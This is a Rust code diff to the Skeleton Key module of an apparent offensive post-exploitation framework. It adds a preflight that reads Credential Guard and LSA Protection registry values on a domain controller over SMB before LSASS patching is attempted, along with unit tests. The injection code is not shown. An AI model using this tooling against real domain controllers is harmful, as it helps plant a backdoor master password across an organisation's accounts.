@@ -30,6 +30,10 @@
 
 use crate::error::{OverthroneError, Result};
 use crate::postex::skeleton_key_dll::SKELETON_KEY_DLL_BYTES;
+use crate::proto::registry::{
+    PredefinedHive, REG_DWORD, RemoteRegValue, read_remote_registry_value, registry_paths,
+};
+use crate::proto::smb::SmbSession;
 use serde::{Deserialize, Serialize};
 use tracing::{info, warn};
 
@@ -131,6 +135,290 @@ impl std::fmt::Display for DeploymentMethod {
     }
 }
 
+/// Skeleton Key preflight decision before touching LSASS.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+pub enum SkeletonKeyPreflightStatus {
+    /// Required hardening checks passed.
+    Allowed,
+    /// The target reports Credential Guard or LSA protection indicators.
+    Blocked,
+    /// The preflight could not collect enough evidence to make a safe decision.
+    Unknown,
+}
+
+/// Evidence collected before attempting Skeleton Key / LSASS modification.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+pub struct SkeletonKeyPreflight {
+    /// Target host or endpoint the evidence applies to.
+    pub target: String,
+    /// Final safety decision.
+    pub status: SkeletonKeyPreflightStatus,
+    /// True when LsaCfgFlags indicates Credential Guard.
+    pub credential_guard_enabled: bool,
+    /// True when RunAsPPL indicates LSA protected process light.
+    pub lsa_protection_enabled: bool,
+    /// Raw HKLM\SYSTEM\CurrentControlSet\Control\Lsa\LsaCfgFlags value.
+    pub lsa_cfg_flags: Option<u32>,
+    /// Raw HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL value.
+    pub run_as_ppl: Option<u32>,
+    /// True when the MSV1_0 isolated credential root secret indicator exists.
+    #[serde(default)]
+    pub isolated_credentials_root_secret: bool,
+    /// Operator-facing warnings for reports and CLI output.
+    pub warnings: Vec<String>,
+    /// Evidence lines suitable for reports and audit logs.
+    pub evidence: Vec<String>,
+}
+
+impl SkeletonKeyPreflight {
+    /// Whether execution should be refused.
+    pub fn is_blocked(&self) -> bool {
+        self.status == SkeletonKeyPreflightStatus::Blocked
+    }
+
+    /// Whether the check is inconclusive.
+    pub fn is_unknown(&self) -> bool {
+        self.status == SkeletonKeyPreflightStatus::Unknown
+    }
+
+    /// Compact report text for CLI/report embedding.
+    pub fn summary(&self) -> String {
+        format!(
+            "Skeleton Key preflight for {}: {:?} (LsaCfgFlags={:?}, RunAsPPL={:?})",
+            self.target, self.status, self.lsa_cfg_flags, self.run_as_ppl
+        )
+    }
+}
+
+/// Assess LSA hardening values collected locally or via remote registry.
+pub fn assess_lsa_protection_values(
+    target: impl Into<String>,
+    lsa_cfg_flags: Option<u32>,
+    run_as_ppl: Option<u32>,
+) -> SkeletonKeyPreflight {
+    assess_lsa_protection_values_with_isolated_secret(target, lsa_cfg_flags, run_as_ppl, false)
+}
+
+/// Assess LSA hardening values, including the MSV1_0 Credential Guard indicator.
+pub fn assess_lsa_protection_values_with_isolated_secret(
+    target: impl Into<String>,
+    lsa_cfg_flags: Option<u32>,
+    run_as_ppl: Option<u32>,
+    isolated_credentials_root_secret: bool,
+) -> SkeletonKeyPreflight {
+    let target = target.into();
+    let credential_guard_enabled = lsa_cfg_flags.is_some_and(|value| value != 0);
+    let lsa_protection_enabled = run_as_ppl.is_some_and(|value| value != 0);
+
+    let mut warnings = Vec::new();
+    let mut evidence = vec![
+        format!("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\LsaCfgFlags={lsa_cfg_flags:?}"),
+        format!("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL={run_as_ppl:?}"),
+        format!(
+            "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0\\IsolatedCredentialsRootSecret present={isolated_credentials_root_secret}"
+        ),
+    ];
+
+    let credential_guard_indicated = credential_guard_enabled || isolated_credentials_root_secret;
+
+    let status = if credential_guard_indicated || lsa_protection_enabled {
+        if credential_guard_indicated {
+            warnings.push(
+                "Credential Guard is enabled; Skeleton Key LSASS patching is refused".to_string(),
+            );
+        }
+        if lsa_protection_enabled {
+            warnings.push(
+                "LSA Protection (RunAsPPL) is enabled; Skeleton Key LSASS patching is refused"
+                    .to_string(),
+            );
+        }
+        SkeletonKeyPreflightStatus::Blocked
+    } else if lsa_cfg_flags == Some(0) && run_as_ppl == Some(0) {
+        evidence
+            .push("Credential Guard and LSA Protection registry indicators are disabled".into());
+        SkeletonKeyPreflightStatus::Allowed
+    } else {
+        warnings.push(
+            "Credential Guard / LSA Protection preflight is inconclusive; remote registry evidence is incomplete"
+                .to_string(),
+        );
+        SkeletonKeyPreflightStatus::Unknown
+    };
+
+    SkeletonKeyPreflight {
+        target,
+        status,
+        credential_guard_enabled: credential_guard_indicated,
+        lsa_protection_enabled,
+        lsa_cfg_flags,
+        run_as_ppl,
+        isolated_credentials_root_secret,
+        warnings,
+        evidence,
+    }
+}
+
+/// Collect Skeleton Key safety evidence from a target's remote registry.
+pub async fn assess_skeleton_key_preflight_from_registry(
+    smb_session: &mut SmbSession,
+    target: impl Into<String>,
+) -> SkeletonKeyPreflight {
+    let target = target.into();
+    let (lsa_cfg_flags, mut warnings, mut evidence) =
+        read_lsa_dword(smb_session, "LsaCfgFlags").await;
+    let (run_as_ppl, run_warnings, run_evidence) = read_lsa_dword(smb_session, "RunAsPPL").await;
+    warnings.extend(run_warnings);
+    evidence.extend(run_evidence);
+    let (isolated_credentials_root_secret, iso_warnings, iso_evidence) =
+        read_isolated_credentials_root_secret_indicator(smb_session).await;
+    warnings.extend(iso_warnings);
+    evidence.extend(iso_evidence);
+
+    let mut preflight = assess_lsa_protection_values_with_isolated_secret(
+        target,
+        lsa_cfg_flags,
+        run_as_ppl,
+        isolated_credentials_root_secret,
+    );
+    preflight.warnings.splice(0..0, warnings);
+    preflight.evidence.splice(0..0, evidence);
+    preflight
+}
+
+async fn read_isolated_credentials_root_secret_indicator(
+    smb_session: &mut SmbSession,
+) -> (bool, Vec<String>, Vec<String>) {
+    const MSV1_0_PATH: &str = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0";
+    const VALUE_NAME: &str = "IsolatedCredentialsRootSecret";
+
+    match read_remote_registry_value(
+        smb_session,
+        PredefinedHive::LocalMachine,
+        MSV1_0_PATH,
+        VALUE_NAME,
+    )
+    .await
+    {
+        Ok(value) => (
+            true,
+            Vec::new(),
+            vec![format!(
+                "HKLM\\{}\\{} present (type={}, bytes={})",
+                MSV1_0_PATH,
+                VALUE_NAME,
+                value.data_type,
+                value.data.len()
+            )],
+        ),
+        Err(err) => (
+            false,
+            vec![format!(
+                "Could not confirm MSV1_0 isolated credential indicator: {err}"
+            )],
+            vec![format!(
+                "Remote registry read did not find HKLM\\{}\\{}",
+                MSV1_0_PATH, VALUE_NAME
+            )],
+        ),
+    }
+}
+
+async fn read_lsa_dword(
+    smb_session: &mut SmbSession,
+    value_name: &str,
+) -> (Option<u32>, Vec<String>, Vec<String>) {
+    match read_remote_registry_value(
+        smb_session,
+        PredefinedHive::LocalMachine,
+        registry_paths::LSA_CONFIG,
+        value_name,
+    )
+    .await
+    {
+        Ok(value) => registry_dword_value(value_name, &value),
+        Err(err) => (
+            None,
+            vec![format!(
+                "Could not read LSA registry value {value_name}: {err}"
+            )],
+            vec![format!(
+                "Remote registry read failed for HKLM\\{}\\{}",
+                registry_paths::LSA_CONFIG,
+                value_name
+            )],
+        ),
+    }
+}
+
+fn registry_dword_value(
+    value_name: &str,
+    value: &RemoteRegValue,
+) -> (Option<u32>, Vec<String>, Vec<String>) {
+    if value.data_type != REG_DWORD {
+        return (
+            None,
+            vec![format!(
+                "LSA registry value {value_name} had unexpected type {}",
+                value.data_type
+            )],
+            vec![format!(
+                "HKLM\\{}\\{} type={} bytes={}",
+                registry_paths::LSA_CONFIG,
+                value_name,
+                value.data_type,
+                value.data.len()
+            )],
+        );
+    }
+
+    match parse_reg_dword_bytes(&value.data) {
+        Some(parsed) => (
+            Some(parsed),
+            Vec::new(),
+            vec![format!(
+                "HKLM\\{}\\{}={} (REG_DWORD)",
+                registry_paths::LSA_CONFIG,
+                value_name,
+                parsed
+            )],
+        ),
+        None => (
+            None,
+            vec![format!(
+                "LSA registry value {value_name} could not be parsed as REG_DWORD"
+            )],
+            vec![format!(
+                "HKLM\\{}\\{} unparsable bytes={}",
+                registry_paths::LSA_CONFIG,
+                value_name,
+                value.data.len()
+            )],
+        ),
+    }
+}
+
+fn parse_reg_dword_bytes(data: &[u8]) -> Option<u32> {
+    if data.len() < 4 {
+        return None;
+    }
+    Some(u32::from_le_bytes(data[0..4].try_into().ok()?))
+}
+
+fn parse_reg_query_dword(stdout: &str, value_name: &str) -> Option<u32> {
+    stdout.lines().find_map(|line| {
+        if !line.contains(value_name) || !line.contains("REG_DWORD") {
+            return None;
+        }
+        line.split_whitespace().rev().find_map(|token| {
+            let hex = token
+                .strip_prefix("0x")
+                .or_else(|| token.strip_prefix("0X"))?;
+            u32::from_str_radix(hex, 16).ok()
+        })
+    })
+}
+
 // ═══════════════════════════════════════════════════════════
 // Skeleton Key Result
 // ═══════════════════════════════════════════════════════════
@@ -195,18 +483,27 @@ impl SkeletonKeyExploiter {
             self.config.target_dc, self.config.target_dc_ip
         );
 
-        // Check if Credential Guard is enabled
-        if self.check_credential_guard().await {
-            warn!("Credential Guard is enabled on target — skeleton key attack will fail");
+        let preflight = self.check_skeleton_key_preflight().await;
+        if preflight.is_blocked() {
+            warn!(
+                "Skeleton Key refused by preflight on {}: {:?}",
+                self.config.target_dc, preflight.warnings
+            );
             return Ok(SkeletonKeyResult {
                 success: false,
                 method: self.config.deployment_method.to_string(),
                 target_dc: self.config.target_dc.clone(),
                 master_password_hash: self.compute_master_hash(),
-                verification: Some("Credential Guard detected — attack blocked".to_string()),
-                error: Some("Credential Guard / LSA Protection is enabled".to_string()),
+                verification: Some(preflight.summary()),
+                error: Some(preflight.warnings.join("; ")),
                 cleanup_commands: Vec::new(),
             });
+        }
+        if preflight.is_unknown() {
+            warn!(
+                "Skeleton Key preflight inconclusive on {}: {:?}",
+                self.config.target_dc, preflight.warnings
+            );
         }
 
         // Deploy based on selected method
@@ -255,43 +552,44 @@ impl SkeletonKeyExploiter {
     /// Verify that the skeleton key is active.
     async fn verify_skeleton_key(&self) -> Result<String> {
         info!("Verifying skeleton key deployment");
-        Ok(format!(
-            "Skeleton key verification: Master password '{}' should authenticate any user",
-            self.config.master_password
-        ))
+        Ok("Skeleton key verification requires an operator-controlled authentication check; plaintext master password is not logged".to_string())
     }
 
     /// Check if Credential Guard / LSA Protection is enabled.
-    async fn check_credential_guard(&self) -> bool {
+    async fn check_skeleton_key_preflight(&self) -> SkeletonKeyPreflight {
         info!(
-            "Checking Credential Guard status on {}",
+            "Checking Credential Guard / LSA Protection status on {}",
             self.config.target_dc
         );
         #[cfg(windows)]
         {
-            // Check registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
-            // LsaCfgFlags: 1 = UEFI locked, 2 = UEFI unlocked, 0 = disabled
             use std::process::Command;
-            let output = Command::new("reg")
-                .args([
-                    "query",
-                    r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa",
-                    "/v",
-                    "LsaCfgFlags",
-                ])
-                .output();
 
-            match output {
-                Ok(out) => {
-                    let stdout = String::from_utf8_lossy(&out.stdout);
-                    stdout.contains("0x1") || stdout.contains("0x2")
+            let read_local = |value_name: &str| -> Option<u32> {
+                let output = Command::new("reg")
+                    .args([
+                        "query",
+                        r"HKLM\SYSTEM\CurrentControlSet\Control\Lsa",
+                        "/v",
+                        value_name,
+                    ])
+                    .output()
+                    .ok()?;
+                if !output.status.success() {
+                    return None;
                 }
-                Err(_) => false,
-            }
+                parse_reg_query_dword(&String::from_utf8_lossy(&output.stdout), value_name)
+            };
+
+            assess_lsa_protection_values(
+                self.config.target_dc.clone(),
+                read_local("LsaCfgFlags"),
+                read_local("RunAsPPL"),
+            )
         }
         #[cfg(not(windows))]
         {
-            false
+            assess_lsa_protection_values(self.config.target_dc.clone(), None, None)
         }
     }
 
@@ -889,6 +1187,86 @@ mod tests {
         let exploiter = SkeletonKeyExploiter::new(config);
         let hash = exploiter.compute_master_hash();
         assert_eq!(hash.len(), 32);
+    }
+
+    #[test]
+    fn test_reg_dword_parser_requires_four_bytes() {
+        assert_eq!(parse_reg_dword_bytes(&[0x02, 0x00, 0x00, 0x00]), Some(2));
+        assert_eq!(parse_reg_dword_bytes(&[0x01, 0x00, 0x00]), None);
+    }
+
+    #[test]
+    fn test_reg_query_parser_extracts_hex_value() {
+        let stdout = r#"
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
+    RunAsPPL    REG_DWORD    0x1
+"#;
+        assert_eq!(parse_reg_query_dword(stdout, "RunAsPPL"), Some(1));
+        assert_eq!(parse_reg_query_dword(stdout, "LsaCfgFlags"), None);
+    }
+
+    #[test]
+    fn test_preflight_blocks_credential_guard() {
+        let preflight = assess_lsa_protection_values("dc01", Some(2), Some(0));
+        assert_eq!(preflight.status, SkeletonKeyPreflightStatus::Blocked);
+        assert!(preflight.credential_guard_enabled);
+        assert!(!preflight.lsa_protection_enabled);
+        assert!(
+            preflight
+                .warnings
+                .iter()
+                .any(|w| w.contains("Credential Guard"))
+        );
+    }
+
+    #[test]
+    fn test_preflight_blocks_isolated_credentials_indicator() {
+        let preflight =
+            assess_lsa_protection_values_with_isolated_secret("dc01", Some(0), Some(0), true);
+        assert_eq!(preflight.status, SkeletonKeyPreflightStatus::Blocked);
+        assert!(preflight.credential_guard_enabled);
+        assert!(preflight.isolated_credentials_root_secret);
+        assert!(
+            preflight
+                .evidence
+                .iter()
+                .any(|e| e.contains("IsolatedCredentialsRootSecret"))
+        );
+    }
+
+    #[test]
+    fn test_preflight_blocks_run_as_ppl() {
+        let preflight = assess_lsa_protection_values("dc01", Some(0), Some(1));
+        assert_eq!(preflight.status, SkeletonKeyPreflightStatus::Blocked);
+        assert!(!preflight.credential_guard_enabled);
+        assert!(preflight.lsa_protection_enabled);
+        assert!(
+            preflight
+                .warnings
+                .iter()
+                .any(|w| w.contains("LSA Protection"))
+        );
+    }
+
+    #[test]
+    fn test_preflight_allows_when_indicators_disabled() {
+        let preflight = assess_lsa_protection_values("dc01", Some(0), Some(0));
+        assert_eq!(preflight.status, SkeletonKeyPreflightStatus::Allowed);
+        assert!(!preflight.credential_guard_enabled);
+        assert!(!preflight.lsa_protection_enabled);
+        assert!(preflight.warnings.is_empty());
+    }
+
+    #[test]
+    fn test_preflight_unknown_when_evidence_missing() {
+        let preflight = assess_lsa_protection_values("dc01", Some(0), None);
+        assert_eq!(preflight.status, SkeletonKeyPreflightStatus::Unknown);
+        assert!(
+            preflight
+                .warnings
+                .iter()
+                .any(|w| w.contains("inconclusive"))
+        );
     }
 
     #[test]
